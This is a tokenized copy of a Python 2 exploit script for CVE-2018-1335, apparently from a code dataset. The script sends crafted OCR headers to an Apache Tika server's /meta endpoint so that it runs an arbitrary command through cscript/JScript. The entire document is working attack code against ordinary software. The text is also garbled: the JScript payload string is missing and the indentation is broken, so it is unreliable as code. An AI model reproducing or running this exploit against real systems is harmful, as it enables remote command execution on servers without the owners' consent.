Number of functions: 1
331
 utf-8 import sys 
 import requests 
 if len ( sys . argv ) < 4 : 
 	 print "Usage: python CVE-2018-1335.py <host> <port> <command>" 
 print "Example: python CVE-2018-1335.py localhost 9998 calc.exe" 
  else : 
 	 host = sys . argv [ 1 ] 
 port = sys . argv [ 2 ] 
 cmd = sys . argv [ 3 ] 
 url = host + ":" + str ( port ) + "/meta" 
 headers = { "X-Tika-OCRTesseractPath" : "\"cscript\"" , "X-Tika-OCRLanguage" : "//E:Jscript" , "Expect" : "100-continue" , "Content-type" : "image/jp2" , "Connection" : "close" } 
 jscript = . format ( cmd ) 
 try : 
 		 requests . put ( "https://" + url , headers = headers , data = jscript , verify = False ) 
  except : 
 		 try : 
 			 requests . put ( "http://" + url , headers = headers , data = jscript ) 
  except : 
 			 print "Something went wrong.\nUsage: python CVE-2018-1335.py <host> <port> <command>"     